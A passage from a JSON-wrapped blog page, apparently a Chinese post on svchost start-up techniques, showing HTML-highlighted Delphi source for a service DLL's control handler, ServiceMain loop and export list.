class=\"built_in\">SetServiceStatus</span>( SvcStatsHandle, srvStatus );</span><br><span class=\"line\">　END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　<span class=\"function\">PROCEDURE <span class=\"title\">servicehandler</span><span class=\"params\">(fdwcontrol:integer)</span></span>; STDCALL;</span><br><span class=\"line\">　BEGIN</span><br><span class=\"line\">　</span><br><span class=\"line\">　 CASE fdwcontrol OF</span><br><span class=\"line\">　</span><br><span class=\"line\">　 SERVICE_CONTROL_STOP:</span><br><span class=\"line\">　 <span class=\"function\">BEGIN</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">TellSCM</span><span class=\"params\">( SERVICE_STOP_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> )</span></span>;</span><br><span class=\"line\">　 <span class=\"built_in\">Sleep</span>(<span class=\"number\">10</span>);</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_STOPPED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　 END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 SERVICE_CONTROL_PAUSE:</span><br><span class=\"line\">　 <span class=\"function\">BEGIN</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">TellSCM</span><span class=\"params\">( SERVICE_PAUSE_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> )</span></span>;</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_PAUSED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　 END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 SERVICE_CONTROL_CONTINUE:</span><br><span class=\"line\">　 <span class=\"function\">BEGIN</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">TellSCM</span><span class=\"params\">( SERVICE_CONTINUE_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> )</span></span>;</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_RUNNING, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　 END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 SERVICE_CONTROL_INTERROGATE:</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( dwCurrState, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　 </span><br><span class=\"line\">　 SERVICE_CONTROL_SHUTDOWN:</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_STOPPED, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　</span><br><span class=\"line\">　 END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　END;</span><br><span class=\"line\">　</span><br><span class=\"line\">　</span><br><span class=\"line\">　<span class=\"function\">procedure <span class=\"title\">ServiceMain</span><span class=\"params\">(argc : Integer; VAR argv : pchar )</span></span>; StdCall;</span><br><span class=\"line\">　begin</span><br><span class=\"line\">　 &#123; <span class=\"function\"><span class=\"keyword\">try</span></span></span><br><span class=\"line\"><span class=\"function\">　 begin</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"keyword\">if</span> <span class=\"title\">ParamStr</span><span class=\"params\">(<span class=\"number\">1</span>)</span> &lt;&gt; &#x27;&#x27; then</span></span><br><span class=\"line\"><span class=\"function\">　 svcname :=</span> <span class=\"built_in\">strNew</span>(<span class=\"built_in\">PChar</span>(<span class=\"built_in\">ParamStr</span>(<span class=\"number\">1</span>)))</span><br><span class=\"line\">　 <span class=\"keyword\">else</span></span><br><span class=\"line\">　 begin</span><br><span class=\"line\">　 svcname := <span class=\"built_in\">strAlloc</span>(<span class=\"number\">10</span> * <span class=\"built_in\">Sizeof</span>(Char));</span><br><span class=\"line\">　 svcname := <span class=\"string\">&#x27;none&#x27;</span>;</span><br><span class=\"line\">　 end;</span><br><span class=\"line\">　 <span class=\"built_in\">OutPutText</span>(svcname);</span><br><span class=\"line\">　 <span class=\"function\">end</span></span><br><span class=\"line\"><span class=\"function\">　 finally</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">strdispose</span><span class=\"params\">(svcname)</span></span>;</span><br><span class=\"line\">　 end;</span><br><span class=\"line\">　 &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">　 SvcStatsHandle := <span class=\"built_in\">RegisterServiceCtrlHandler</span>(ServiceName, @servicehandler);</span><br><span class=\"line\">　 <span class=\"built_in\">IF</span> (SvcStatsHandle = <span class=\"number\">0</span>) <span class=\"function\">THEN</span></span><br><span class=\"line\"><span class=\"function\">　 BEGIN</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">OutPutText</span><span class=\"params\">(<span class=\"string\">&#x27;Error in RegisterServiceCtrlHandler&#x27;</span>)</span></span>;</span><br><span class=\"line\">　 exit;</span><br><span class=\"line\">　 <span class=\"function\">END</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"keyword\">else</span></span></span><br><span class=\"line\"><span class=\"function\">　 begin</span></span><br><span class=\"line\"><span class=\"function\">　 <span class=\"title\">FreeConsole</span><span class=\"params\">()</span></span>;</span><br><span class=\"line\">　 end;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_START_PENDING, <span class=\"number\">0</span>, <span class=\"number\">1</span> );</span><br><span class=\"line\">　 <span class=\"built_in\">TellSCM</span>( SERVICE_RUNNING, <span class=\"number\">0</span>, <span class=\"number\">0</span> );</span><br><span class=\"line\">　 <span class=\"built_in\">OutPutText</span>(<span class=\"string\">&#x27;Service is Running&#x27;</span>);</span><br><span class=\"line\">　</span><br><span class=\"line\"></span><br><span class=\"line\">　 <span class=\"keyword\">while</span> ((dwCurrState &lt;&gt; SERVICE_STOP_PENDING) <span class=\"built_in\">and</span> (dwCurrState &lt;&gt; SERVICE_STOPPED)) <span class=\"function\"><span class=\"keyword\">do</span></span></span><br><span class=\"line\"><span class=\"function\">　 begin</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">showmessage</span><span class=\"params\">(<span class=\"string\">&#x27;实在无聊&#x27;</span>)</span>　 </span></span><br><span class=\"line\"><span class=\"function\">　 end</span>;</span><br><span class=\"line\">　</span><br><span class=\"line\">　 <span class=\"built_in\">OutPutText</span>(<span class=\"string\">&#x27;Service Exit&#x27;</span>);</span><br><span class=\"line\">　 </span><br><span class=\"line\">　end;</span><br><span class=\"line\">　</span><br><span class=\"line\">　</span><br><span class=\"line\">　<span class=\"comment\">// 导出函数列表</span></span><br><span class=\"line\">　exports</span><br><span class=\"line\">　 ServiceMain;</span><br><span class=\"line\">　</span><br><span class=\"line\">　&#123; dll入口点 &#125;</span><br><span class=\"line\">　begin</span><br><span class=\"line\">　 DllProc := @DLLEntryPoint;</span><br><span class=\"line\">　end. </span><br></pre></td></tr></table></figure>\n","_path":"20191201/svchost-qi-dong-ji-zhu/","_link":"https://yaoqs.github.io/20191201/svchost-qi-dong-ji-zhu/","_id":"clzpq9hts002msger2khe8pqc"}}